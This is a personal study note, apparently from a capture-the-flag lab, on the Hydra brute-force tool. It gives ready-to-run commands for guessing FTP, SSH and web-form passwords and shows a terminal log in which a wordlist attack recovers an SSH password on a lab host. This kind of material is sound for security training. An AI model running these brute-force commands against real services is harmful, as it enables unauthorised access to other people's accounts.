### Hydra

More Info: https://github.com/frizb/Hydra-Cheatsheet


What is Hydra?
Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

We can use Hydra to run through a list and 'bruteforce' some authentication service. Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.

#### Hydra Commands

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

Sample: SSH

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

![[Pasted image 20220815022115.png]]

Post Web Form
We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, or simply view the source code.

Below is an example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

![[Pasted image 20220815022213.png]]

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
└─$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 10.10.134.118 ssh 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 08:00:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.134.118:2222/
[2222][ssh] host: 10.10.134.118   login: mitch   password: secret
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 08:01:12
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/simple_CTF]
└─$      
```

